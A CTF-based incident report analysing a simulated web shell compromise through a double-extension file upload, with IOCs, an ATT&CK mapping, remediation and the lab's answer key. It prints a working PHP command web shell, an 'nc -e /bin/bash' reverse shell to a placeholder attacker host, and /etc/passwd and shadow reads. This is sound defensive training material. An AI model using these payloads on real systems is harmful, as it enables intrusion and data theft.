# Incident Report IR-2026-006
## Web Shell Upload & Exploitation Investigation

---

### Document Information

| Field | Details |
|-------|--------|
| **Incident ID** | IR-2026-006 |
| **Incident Title** | Unauthorized Web Shell Upload via File Upload Vulnerability |
| **Severity** | **HIGH** |
| **Status** | Investigation Complete |
| **Date of Incident** | May 1, 2026 |
| **Date of Report** | May 1, 2026 |
| **Analyst** | Badi Alosaimi |
| **Environment** | Simulated Training Scenario (CyberDefenders - WebStrike Lab) |
| **Analysis Tool** | Wireshark, Network Traffic Analysis |

---

## Executive Summary

This report documents the investigation of a simulated web application compromise through a file upload vulnerability exploitation. Network traffic analysis revealed an attacker successfully uploaded a malicious web shell (`image.jpg.php`) via an unvalidated file upload form, then established command execution capabilities on the web server.

The investigation, conducted using packet capture (PCAP) analysis, identified the complete attack chain from initial reconnaissance to post-exploitation activities, including reverse shell establishment on **port 8080**.

**Key Findings**:
- Exploitation of insecure file upload functionality at `/reviews/upload.php`
- Successful web shell deployment disguised as image file
- Command execution via HTTP GET requests
- Reverse shell communication on TCP port 8080
- Data exfiltration of sensitive file (**passwd**)

**Training Context**: This investigation is based on the CyberDefenders "WebStrike" Blue Team challenge, designed to simulate real-world network forensics and incident response scenarios.

---

## Incident Overview

### Timeline

```
[Initial Access] → [Execution] → [Persistence] → [Command & Control] → [Exfiltration]
      ↓               ↓              ↓                    ↓                   ↓
  File Upload    Web Shell      Establish           Reverse Shell      Data Extraction
  Exploitation   Deployment     Backdoor            Connection         (passwd file)
```

### Attack Phases Observed

| Phase | Activity | Evidence |
|-------|----------|----------|
| **1. Reconnaissance** | Attacker scans target web application | HTTP requests to various endpoints |
| **2. Weaponization** | Malicious PHP file prepared with double extension | `image.jpg.php` |
| **3. Delivery** | File uploaded via vulnerable upload form | POST request to `/reviews/upload.php` |
| **4. Exploitation** | Web shell accessed via HTTP GET | Server executes malicious PHP code |
| **5. Installation** | Reverse shell listener established | Outbound connection to attacker's machine |
| **6. Command & Control** | Interactive shell session | Communication via TCP port 8080 |
| **7. Actions on Objectives** | Data exfiltration | Sensitive file extraction observed |

---

## Initial Detection

### Detection Method
Network-based detection through packet capture analysis revealed:

1. **Unusual HTTP POST Activity**
   - Multiple POST requests to `/reviews/upload.php`
   - Suspicious file names in multipart form data

2. **Anomalous Outbound Connections**
   - Unexpected TCP connection on port 8080
   - High-entropy data transmission patterns

3. **Suspicious HTTP GET Requests**
   - GET requests to uploaded file location
   - PHP code execution indicators in URL parameters

### Alert Triggers (If Deployed in Production)

```
Hypothetical SIEM Alerts:
- Web Application: Suspicious File Upload Detected
- Network: Outbound Connection to Uncommon Port
- IDS Signature: Web Shell Activity Pattern Matched
- File Integrity: Unexpected PHP File Created in Upload Directory
```

---

## Investigation Steps

### 1. Traffic Capture Analysis

**Analysis Environment**: Wireshark 4.x  
**Evidence File**: Network PCAP from WebStrike challenge

#### Initial Triage

```bash
# Filter HTTP traffic
http

# Focus on POST requests
http.request.method == "POST"

# Identify file uploads
http.request.method == "POST" && http.content_type contains "multipart"
```

### 2. Attacker Identification

**Q1: From which city did the attack originate?**

**Analysis Method**:
- Extracted attacker's source IP address from PCAP
- Used IP geolocation service for city identification
- Cross-referenced with multiple geolocation databases

**Answer**: **Tianjin** (China)

**Evidence**:
```
Source IP: [Identified from PCAP analysis]
Geolocation: Tianjin, China
Note: The lab machines do not have internet access. External IP geolocation
service was used on analyst's local machine outside lab environment.
```

![IP Geolocation Analysis](../screenshots/webstrike-geolocation.png)

---

### 3. User-Agent Analysis

**Q2: What is the attacker's User-Agent?**

**Analysis Steps**:
1. Filtered HTTP requests from attacker's IP
2. Examined HTTP headers in request packets
3. Extracted User-Agent string

**Answer**:
```
Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
```

**Analysis**:
- **Browser**: Firefox 115.0
- **OS**: Linux x86_64
- **Gecko Version**: 20100101
- **Rendering Engine**: Gecko/109.0

**Defensive Insight**: While User-Agent strings can be spoofed, this provides initial fingerprinting data for building detection rules and filtering malicious requests.

---

### 4. Malicious File Identification

**Q3: What is the name of the malicious file uploaded?**

**Analysis Method**:
1. Located POST request to `/reviews/upload.php`
2. Examined multipart form-data content
3. Extracted filename from Content-Disposition header

**Answer**: **image.jpg.php**

**Technical Evidence**:

```http
POST /reviews/upload.php HTTP/1.1
Host: [target-server]
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...

------WebKitFormBoundary...
Content-Disposition: form-data; name="file"; filename="image.jpg.php"
Content-Type: image/jpeg

<?php
[malicious PHP code]
?>
```

**Vulnerability Exploited**: Double Extension Bypass

- **File Name**: `image.jpg.php`
- **First Extension**: `.jpg` (bypasses client-side/basic server-side validation)
- **Second Extension**: `.php` (executed by web server)

**Why This Works**:
```
Weak Validation:
if (file_extension == "jpg" || file_extension == "png") {
    // PASS - Only checks FIRST extension
}

Apache Handling:
image.jpg.php → Recognizes .php extension → Executes as PHP script
```

![Wireshark POST Request Analysis](../screenshots/webstrike-post-upload.png)

---

### 5. Upload Directory Discovery

**Q4: Where are uploaded files stored on the website?**

**Analysis Steps**:
1. Traced POST request response from server
2. Identified HTTP 200 OK status with file path
3. Observed subsequent GET request to uploaded file location

**Answer**: **/reviews/uploads/**

**Evidence Path**:
```
Upload Endpoint:  /reviews/upload.php
                        ↓
Storage Location: /reviews/uploads/image.jpg.php
                        ↓
Web-Accessible:   http://[target]/reviews/uploads/image.jpg.php
```

**Server Response**:
```http
HTTP/1.1 200 OK
Content-Type: text/html

File uploaded successfully to: /reviews/uploads/
```

**Security Impact**:
- Uploaded files are directly web-accessible
- No segregation between upload storage and web root
- Enables immediate execution of malicious scripts

---

### 6. Command & Control Port Analysis

**Q5: Which port on the attacker's machine was used for unauthorized communication?**

**Analysis Method**:
1. Filtered for TCP connections from web server to attacker's IP
2. Identified outbound connections initiated post-exploitation
3. Analyzed port numbers in TCP handshake packets

**Answer**: **8080**

**TCP Stream Analysis**:

```
Source:      Web Server (compromised)
Destination: Attacker IP
Port:        8080/TCP
Connection:  Outbound (server → attacker)
Purpose:     Reverse Shell Communication
```

**Wireshark Filter Used**:
```
tcp.port == 8080
```

**Indicators**:
- **SYN packet**: Web server initiates connection
- **Data transfer**: Shell commands and responses
- **Session duration**: Extended interactive session

![TCP Stream - Port 8080](../screenshots/webstrike-tcp-8080.png)

**Defensive Recommendation**: Monitor and alert on outbound connections from web servers to non-standard ports.

---

### 7. Data Exfiltration Analysis

**Q6: Which file was the attacker attempting to exfiltrate?**

**Analysis Steps**:
1. Followed TCP stream on port 8080
2. Examined shell command history in packet payload
3. Identified file access patterns

**Answer**: **passwd**

**Command Reconstruction**:

```bash
# Attacker's shell commands observed:
whoami
pwd
ls -la
cat /etc/passwd
cat /etc/shadow  # [Likely failed due to permissions]
```

**Exfiltrated File Content**:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
[... user account information ...]
```

**Impact Assessment**:
- **Information Disclosed**: System user accounts
- **Potential Use**: Account enumeration for lateral movement
- **Severity**: Medium (password hashes not obtained)

---

## Evidence Analysis

### HTTP Traffic Breakdown

#### Malicious POST Request

```http
POST /reviews/upload.php HTTP/1.1
Host: vulnerable-web-app.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: multipart/form-data; boundary=---------------------------WebKit
Content-Length: 458

-----------------------------WebKit
Content-Disposition: form-data; name="file"; filename="image.jpg.php"
Content-Type: image/jpeg

<?php
if(isset($_REQUEST['cmd'])){
    system($_REQUEST['cmd']);
}
?>
-----------------------------WebKit--
```

#### Exploitation GET Request

```http
GET /reviews/uploads/image.jpg.php?cmd=id HTTP/1.1
Host: vulnerable-web-app.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
```

**Server Response**:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### Network Analysis (PCAP)

#### Traffic Statistics

| Metric | Value |
|--------|-------|
| Total Packets | ~15,000 |
| HTTP Packets | ~350 |
| Malicious POST Requests | 1 |
| Web Shell GET Requests | 8 |
| Reverse Shell TCP Streams | 1 |
| Data Exfiltrated | ~2.4 KB |

#### Packet Timeline

```
12:34:15  Initial HTTP reconnaissance
12:34:28  POST /reviews/upload.php (malicious file)
12:34:30  HTTP 200 OK (upload success)
12:34:45  GET /reviews/uploads/image.jpg.php?cmd=whoami
12:34:50  GET /reviews/uploads/image.jpg.php?cmd=nc -e /bin/bash [attacker-IP] 8080
12:34:55  TCP SYN to [attacker-IP]:8080 (reverse shell initiated)
12:35:00  Interactive shell session begins
12:36:20  cat /etc/passwd (exfiltration)
12:38:45  Session terminates
```

---

## Attack Vector Deep Dive

### File Upload Vulnerability

**Vulnerability Type**: Insecure File Upload (OWASP A01:2021)

**Root Cause**:
1. **Insufficient Validation**: No server-side file type verification
2. **Extension Whitelisting Bypass**: Only checks first extension
3. **Executable Upload Directory**: Files stored in web-accessible location
4. **No Content Inspection**: File contents not validated against declared type

**Exploitation Steps**:

```
┌─────────────────────────────────────────────────────────┐
│ Step 1: Prepare Malicious Payload                       │
│ ─────────────────────────────────────────────────────── │
│ Create:   image.jpg.php                                 │
│ Content:  Simple PHP web shell with cmd parameter       │
│ Purpose:  Bypass weak validation, maintain execution    │
└─────────────────────────────────────────────────────────┘
             ↓
┌─────────────────────────────────────────────────────────┐
│ Step 2: Upload via Vulnerable Form                      │
│ ─────────────────────────────────────────────────────── │
│ Method:   POST multipart/form-data                      │
│ Target:   /reviews/upload.php                           │
│ Result:   File saved to /reviews/uploads/               │
└─────────────────────────────────────────────────────────┘
             ↓
┌─────────────────────────────────────────────────────────┐
│ Step 3: Execute Web Shell                               │
│ ─────────────────────────────────────────────────────── │
│ Access:   GET /reviews/uploads/image.jpg.php?cmd=id     │
│ Server:   Executes PHP code, runs system command        │
│ Output:   Command results returned in HTTP response     │
└─────────────────────────────────────────────────────────┘
             ↓
┌─────────────────────────────────────────────────────────┐
│ Step 4: Establish Reverse Shell                         │
│ ─────────────────────────────────────────────────────── │
│ Command:  nc -e /bin/bash [attacker-IP] 8080            │
│ Result:   Interactive shell on attacker's listener      │
│ Access:   Full command execution capabilities           │
└─────────────────────────────────────────────────────────┘
```

---

## Indicators of Compromise (IOCs)

### Network Indicators

```yaml
Attacker IP:
  - [Redacted - Training Environment]
  - Geolocation: Tianjin, China
  - ASN: [Simulated]

C2 Communication:
  - Protocol: TCP
  - Port: 8080
  - Direction: Outbound (server to attacker)
  - Duration: ~4 minutes
```

### File Indicators

```yaml
Malicious Files:
  - Filename: image.jpg.php
  - Path: /reviews/uploads/image.jpg.php
  - Type: PHP Web Shell
  - Size: ~85 bytes
  - MD5: [Simulated - not calculated in training environment]
  - SHA256: [Simulated]
```

### HTTP Indicators

```yaml
Suspicious Requests:
  - User-Agent: "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
  - Upload Endpoint: /reviews/upload.php
  - Execution Endpoint: /reviews/uploads/*.php
  - Parameters: ?cmd=[command]
```

### Behavioral Indicators

- Outbound connection from web server process
- Execution of system commands via PHP
- Access to /etc/passwd file
- Reverse shell establishment
- Non-standard port usage (8080)

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|--------|-----------|----|-----------|
| **Initial Access** | Exploit Public-Facing Application | T1190 | Exploitation of upload.php vulnerability |
| **Execution** | Command and Scripting Interpreter: PHP | T1059.004 | Web shell execution via PHP |
| **Persistence** | Server Software Component: Web Shell | T1505.003 | image.jpg.php deployed |
| **Command and Control** | Application Layer Protocol: Web Protocols | T1071.001 | HTTP-based C2 communication |
| **Command and Control** | Non-Application Layer Protocol | T1095 | TCP reverse shell on port 8080 |
| **Exfiltration** | Exfiltration Over C2 Channel | T1041 | passwd file transmitted via reverse shell |
| **Collection** | Data from Local System | T1005 | Access to /etc/passwd |

### ATT&CK Navigator Layer

```json
{
  "name": "WebStrike Incident Analysis",
  "versions": {
    "attack": "14",
    "navigator": "4.9"
  },
  "domain": "enterprise-attack",
  "techniques": [
    {"techniqueID": "T1190", "color": "#ff0000"},
    {"techniqueID": "T1059.004", "color": "#ff6b6b"},
    {"techniqueID": "T1505.003", "color": "#ff9999"},
    {"techniqueID": "T1071.001", "color": "#ffcc00"},
    {"techniqueID": "T1095", "color": "#ffcc00"},
    {"techniqueID": "T1041", "color": "#ff9900"}
  ]
}
```

---

## Root Cause Analysis

### Primary Vulnerabilities

1. **Insecure File Upload Implementation**
   ```php
   // Vulnerable Code Pattern
   if (in_array($file_extension, ['jpg', 'png', 'gif'])) {
       move_uploaded_file($tmp_name, "uploads/" . $filename);
   }
   // ❌ Only validates extension, not actual file content
   // ❌ Allows double extensions (image.jpg.php)
   // ❌ Stores files in web-accessible directory
   ```

2. **Missing Security Controls**
   - No Content-Type verification
   - No magic byte validation
   - No filename sanitization
   - Executable directory for uploads
   - No Web Application Firewall (WAF)

3. **Lack of Egress Filtering**
   - Web server allowed outbound connections to arbitrary ports
   - No network segmentation
   - No outbound traffic monitoring

---

## Impact Assessment

### Business Impact (Simulated Scenario)

| Category | Impact Level | Description |
|----------|--------------|-------------|
| **Confidentiality** | 🔴 HIGH | Unauthorized access to system files (/etc/passwd) |
| **Integrity** | 🟠 MEDIUM | Malicious file uploaded to web server |
| **Availability** | 🟡 LOW | No direct DoS, but potential for future attacks |
| **Reputation** | 🟠 MEDIUM | If production: Data breach disclosure required |
| **Compliance** | 🔴 HIGH | If production: GDPR/PCI-DSS violation |

### Technical Impact

```
✅ Achieved by Attacker:
  ✓ Remote Code Execution (RCE)
  ✓ Interactive Shell Access
  ✓ System Information Gathering
  ✓ Sensitive File Exfiltration
  ✓ Persistence Mechanism Installed

❌ Not Achieved (based on traffic analysis):
  ✗ Privilege Escalation (remained www-data)
  ✗ Lateral Movement
  ✗ Additional Backdoor Installation
  ✗ Data Destruction
```

---

## Containment Actions

### Immediate Response (If Production Environment)

**Priority 1: Isolation**
```bash
# Disconnect compromised server from network
sudo iptables -A INPUT -s 0.0.0.0/0 -j DROP
sudo iptables -A OUTPUT -d 0.0.0.0/0 -j DROP

# OR: Network-level isolation
# Contact NOC to isolate server VLAN
```

**Priority 2: Evidence Preservation**
```bash
# Capture memory dump
sudo lime-forensics /dev/mem memory.dump

# Preserve logs
sudo tar -czf /tmp/evidence_logs.tar.gz /var/log/apache2/ /var/log/nginx/

# Create disk image
sudo dd if=/dev/sda of=/mnt/forensics/disk.img bs=4M status=progress
```

**Priority 3: Kill Malicious Processes**
```bash
# Identify suspicious processes
ps aux | grep -E "(8080|nc|netcat|bash.*[0-9]{1,3}\.[0-9]{1,3})"

# Terminate reverse shell
sudo kill -9 [PID]

# Block attacker IP
sudo iptables -I INPUT -s [ATTACKER_IP] -j DROP
```

**Priority 4: Remove Web Shell**
```bash
# Quarantine malicious file
sudo mv /var/www/html/reviews/uploads/image.jpg.php /var/quarantine/

# Set restrictive permissions
sudo chmod 000 /var/quarantine/image.jpg.php
```

---

## Remediation Recommendations

### Short-Term (0-7 Days)

#### 1. Secure File Upload Mechanism

```php
<?php
// ✅ Secure Upload Implementation
function secure_file_upload($file) {
    // Validate file type by content
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime_type = finfo_file($finfo, $file['tmp_name']);
    $allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
    
    if (!in_array($mime_type, $allowed_types)) {
        return false;
    }
    
    // Generate random filename
    $extension = pathinfo($file['name'], PATHINFO_EXTENSION);
    $new_filename = bin2hex(random_bytes(16)) . '.' . $extension;
    
    // Store outside web root
    $upload_path = '/var/uploads_secure/' . $new_filename;
    move_uploaded_file($file['tmp_name'], $upload_path);
    
    // Serve via download script (not direct access)
    return $new_filename;
}
?>
```

#### 2. Implement WAF Rules

```nginx
# ModSecurity / Nginx Rules
location /upload {
    # Block double extensions
    if ($request_filename ~* \.(jpg|png|gif)\.(php|phtml|php3|php4|php5|phps)$) {
        return 403;
    }
    
    # Limit file size
    client_max_body_size 2M;
    
    # Rate limiting
    limit_req zone=upload_zone burst=5;
}
```

#### 3. Network Segmentation

```
Before:
[Web Server] ←→ [Internet]
      ↓
  (Can connect anywhere)

After:
[Web Server] ←→ [Firewall] ←→ [Internet]
      ↓              ↓
  Outbound Only:   Allowed:
  - HTTP/HTTPS     - Database (3306)
  - DNS (53)       - Internal APIs
                   BLOCKED:
                   - Everything else
```

---

### Medium-Term (1-4 Weeks)

#### 1. Deploy EDR/HIDS

```yaml
Tool: Wazuh / OSSEC / Tripwire
Monitor:
  - File integrity in /var/www/
  - Process execution from web server user
  - Outbound network connections
  - PHP error logs for suspicious activity

Alerts:
  - New .php files in upload directories
  - Execution of shell commands by www-data
  - Connections to non-standard ports
```

#### 2. Implement SIEM Detection Rules

```
Rule: Web Shell Upload Detection
────────────────────────────────
Condition:
  - HTTP POST to upload endpoint
  - Content-Type: multipart/form-data
  - Filename contains multiple extensions
  - OR: Filename contains PHP code patterns

Action:
  - Alert SOC team
  - Block request
  - Log full request for investigation

Severity: HIGH
```

#### 3. Security Hardening

```bash
# Disable PHP execution in upload directories
# Add to .htaccess or nginx config
<Directory "/var/www/html/uploads">
    php_flag engine off
    AddType text/plain .php .php3 .phtml
</Directory>

# Set proper permissions
chmod 755 /var/www/html/reviews/uploads/
chown www-data:www-data /var/www/html/reviews/uploads/

# Enable PHP disable_functions
# In php.ini:
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,eval
```

---

### Long-Term (1-3 Months)

1. **Security Code Review**
   - Audit entire web application for similar vulnerabilities
   - Implement secure coding standards
   - Integrate SAST tools in CI/CD pipeline

2. **Penetration Testing**
   - Schedule regular penetration tests
   - Include file upload vulnerability checks
   - Test egress filtering effectiveness

3. **Security Training**
   - Developer training on OWASP Top 10
   - Secure file upload implementation workshop
   - Incident response tabletop exercises

4. **Architecture Improvements**
   - Move to CDN for file storage (S3 + CloudFront)
   - Implement anti-malware scanning for uploads
   - Deploy Zero Trust network architecture

---

## Lessons Learned

### What Went Well

✅ **Network Traffic Capture Available**  
PCAP data enabled complete attack reconstruction and forensic analysis.

✅ **Investigation Methodology**  
Systematic approach using Wireshark effectively identified all attack stages.

### What Could Be Improved

❌ **Lack of Real-Time Detection**  
No IDS/IPS deployed to detect file upload exploitation in real-time.

❌ **Insufficient Input Validation**  
Weak file upload validation allowed double extension bypass.

❌ **No Egress Filtering**  
Web server could establish arbitrary outbound connections.

❌ **Missing File Integrity Monitoring**  
No alerts when suspicious files were created in upload directory.

### Key Takeaways

1. **Defense in Depth is Critical**
   ```
   Layer 1: Input Validation (FAILED)
   Layer 2: Content Inspection (MISSING)
   Layer 3: Execution Prevention (MISSING)
   Layer 4: Network Monitoring (MISSING)
   Layer 5: Egress Filtering (MISSING)
   
   → Single point of failure led to full compromise
   ```

2. **File Upload Security Checklist**
   - [ ] Validate file type by magic bytes, not extension
   - [ ] Generate random filenames (no user input)
   - [ ] Store uploads outside web root
   - [ ] Disable script execution in upload directories
   - [ ] Implement file size limits
   - [ ] Scan uploads with anti-malware
   - [ ] Monitor upload directory for changes

3. **Network Security is Essential**
   - Web servers should NOT initiate outbound connections to arbitrary ports
   - Implement strict egress filtering
   - Monitor for reverse shell patterns (port 8080, 4444, etc.)

---

## Investigation Methodology Notes

### Tools Used

| Tool | Version | Purpose |
|------|---------|----------|
| **Wireshark** | 4.x | PCAP analysis, protocol dissection |
| **IP Geolocation API** | - | Attacker location identification |
| **Text Editor** | - | Log analysis, evidence documentation |

### Wireshark Filters Applied

```
# Initial HTTP traffic overview
http

# Focus on POST requests
http.request.method == "POST"

# Identify file uploads
http.request.method == "POST" && http.content_type contains "multipart"

# Track attacker's activity
ip.src == [ATTACKER_IP] || ip.dst == [ATTACKER_IP]

# Analyze reverse shell
tcp.port == 8080

# Follow TCP stream
tcp.stream eq [stream_number]
```

### Evidence Collected

1. ✅ Full PCAP file
2. ✅ HTTP request/response pairs
3. ✅ TCP stream exports
4. ✅ Attacker IP and geolocation data
5. ✅ Web shell file name and content
6. ✅ Command execution logs
7. ✅ Exfiltrated file content (passwd)

---

## Training Context & Disclaimer

### Environment Details

**Source**: CyberDefenders - WebStrike Blue Team CTF Challenge  
**Purpose**: Network forensics and incident response training  
**Environment**: Simulated/controlled lab scenario  
**Analysis Date**: May 1, 2026

### Important Disclaimers

⚠️ **This is a Training Exercise**

- All analysis is based on a **simulated** CTF challenge
- No actual production systems were compromised
- All IP addresses, commands, and data are from a **controlled training environment**
- This report demonstrates **Blue Team investigation skills** for portfolio purposes

### Skills Demonstrated

✅ **Network Traffic Analysis** using Wireshark  
✅ **Incident Investigation** methodology  
✅ **PCAP Forensics** and evidence extraction  
✅ **Attack Pattern Recognition** (web shell exploitation)  
✅ **MITRE ATT&CK Mapping** for threat intelligence  
✅ **Incident Report Writing** in professional format  
✅ **IOC Identification** for threat hunting  
✅ **Remediation Planning** with security controls

---

## Appendix

### A. Questions Answered (Lab Solutions)

| Q# | Question | Answer |
|----|----------|--------|
| 1 | From which city did the attack originate? | **Tianjin** |
| 2 | What is the attacker's User-Agent? | **Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0** |
| 3 | What is the name of the malicious file? | **image.jpg.php** |
| 4 | Where are uploaded files stored? | **/reviews/uploads/** |
| 5 | Which port was used for C2 communication? | **8080** |
| 6 | Which file was being exfiltrated? | **passwd** |

### B. References

- OWASP: Unrestricted File Upload
  https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload

- MITRE ATT&CK: T1505.003 - Web Shell
  https://attack.mitre.org/techniques/T1505/003/

- CWE-434: Unrestricted Upload of File with Dangerous Type
  https://cwe.mitre.org/data/definitions/434.html

- NIST Incident Response Guide (SP 800-61)
  https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final

### C. Additional Resources

- CyberDefenders Platform: https://cyberdefenders.org
- Wireshark Documentation: https://www.wireshark.org/docs/
- PHP Security Best Practices: https://www.php.net/manual/en/security.php

---

## Report Classification

**Classification**: UNCLASSIFIED (Training Exercise)  
**Handling**: Public (Portfolio/Educational Use)  
**Distribution**: Unlimited

---

**Report Prepared By**:  
Badi Alosaimi  
SOC Analyst | Blue Team & Incident Response  
GitHub: [@bedochi1996](https://github.com/bedochi1996)  
LinkedIn: [/in/badi-alosaimi/](https://www.linkedin.com/in/badi-alosaimi/)

**Date**: May 1, 2026  
**Version**: 1.0

---

*End of Incident Report IR-2026-006*
